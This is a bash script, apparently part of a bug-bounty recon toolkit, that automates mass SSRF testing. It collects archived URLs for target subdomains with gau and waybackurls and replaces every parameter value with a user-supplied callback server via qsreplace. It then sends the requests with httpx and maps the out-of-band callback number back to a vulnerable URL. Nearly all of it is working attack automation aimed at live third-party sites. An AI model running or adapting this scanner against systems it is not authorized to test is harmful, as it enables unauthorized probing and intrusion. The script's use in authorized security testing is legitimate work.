#!/bin/bash

clear 

start_time=$(date +%s)  # Record the start time

# M𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 🖤 𝙗𝙮 𝙍4𝙃𝙐𝙇-𝙄𝙉𝘿𝙄𝘼𝙉

echo  # For one-line gap

echo -e "\e[1;33mRADHE RADHE ❤ \e[0m" 

echo  # For one-line gap

echo "Note: This module usually takes 20-25 minutes to finish because it tries to fetch all possible URLs for better results :)"

puredns_file="puredns.txt"
httpx_file="httpx.txt"
output_file="finalsubs.txt"

# Function to add "https://" before each word in puredns.txt
add_https() {
    local input_file="$1"
    local output_file="$2"

    # Create a temporary file to store the modified content
    local tempfile="add_https_temp.txt"

    # Loop through each line in the input file
    while IFS= read -r line; do
        # Check if the line starts with "https://"
        if [[ $line == https://* ]]; then
            # If the line already starts with "https://", use it as is
            modified_line="$line"
        else
            # Otherwise, prepend "https://" to the line
            modified_line="https://$line"
        fi

        # Append modified line to the temporary file
        echo "$modified_line" >> "$tempfile"
    done < "$input_file"

    # Rename the temporary file to the output file
    mv "$tempfile" "$output_file"

}

add_https "$puredns_file" "add_puredns.txt"

cat "add_puredns.txt" "$httpx_file" > "$output_file"


echo  # For one-line gap

echo -e "\e[1;33m[+] Running Gau \e[0m"

cat $output_file | gau --threads 20 >> gau.txt

echo  # For one-line gap

echo -e "\e[1;33m[+] Fecthed Urls from Gau \e[0m"

echo  # For one-line gap

echo -e "\e[1;33m[+] Running Waybackurls \e[0m"

cat $output_file | parallel -j 8 waybackurls >> way.txt 

echo  # For one-line gap

echo -e "\e[1;33m[+] Fecthed Urls from Wayback \e[0m"

cat gau.txt way.txt >> allurls.txt

echo  # For one-line gap

# M𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 🖤 𝙗𝙮 𝙍4𝙃𝙐𝙇-𝙄𝙉𝘿𝙄𝘼𝙉
echo  # For one-line gap

read -p "Enter your Server/Burp Collaborator URL: " server_url

command="cat allurls.txt | grep '=' | qsreplace http://server-url >> ssrf.txt"

updated_command=${command//server-url/$server_url}

eval "$updated_command"

# M𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 🖤 𝙗𝙮 𝙍4𝙃𝙐𝙇-𝙄𝙉𝘿𝙄𝘼𝙉
echo  # For one-line gap

python ssrf.py

cat ssrfnew.txt | httpx -silent -fr > output.txt

# M𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 🖤 𝙗𝙮 𝙍4𝙃𝙐𝙇-𝙄𝙉𝘿𝙄𝘼𝙉

echo "If any of the URL is vulnerable, you will receive a HTTP request on your server."

echo  # For one-line gap

echo "Hint: The number you receive on your server's HTTP request will look like "GET /33". The request method can be any, for example, HEAD. You only need to type the number."

echo  # For one-line gap

read -p "Enter the number received on the server: " server_number

echo  # For one-line gap

mapfile -t urls < "ssrfnew.txt"

# Retrieve the URL based on the user-provided number
url="${urls[$((server_number - 1))]}"

echo

if [[ -n $url ]]; then
    echo "Vulnerable URL: $url"
else
    echo "Invalid number or URL not found."
fi

# if anyone wants to keep any output file for use, they can just remove the filename from this following line below :)

rm gau.txt way.txt add_puredns.txt finalsubs.txt output.txt ssrfnew.txt

echo  # For one-line gap

# For Script Execution Timing

end_time=$(date +%s)  # Record the end time
execution_time=$((end_time - start_time))  

if ((execution_time < 60)); then
  echo "The SSRF Module finished in $execution_time seconds"
else
  minutes=$((execution_time / 60))  
  seconds=$((execution_time % 60))  
  echo "The SSRF Module finished in $minutes minutes $seconds seconds"
fi

# M𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 🖤 𝙗𝙮 𝙍4𝙃𝙐𝙇-𝙄𝙉𝘿𝙄𝘼𝙉

